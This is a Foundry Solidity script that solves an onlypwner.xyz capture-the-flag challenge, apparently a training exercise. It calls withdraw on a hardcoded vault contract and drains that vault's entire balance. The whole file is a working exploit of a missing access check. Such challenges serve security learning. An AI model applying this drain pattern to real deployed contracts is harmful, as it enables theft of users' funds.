pragma solidity 0.8.19;
import {Script} from "forge-std/Script.sol";

// https://onlypwner.xyz/challenges/5 

interface IVault {
    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);

    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

contract Freebie is Script {
    function run() public {
        vm.broadcast();
        IVault vault = IVault(0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88);
        uint256 balance = address(vault).balance;
        vault.withdraw(balance);
    }
}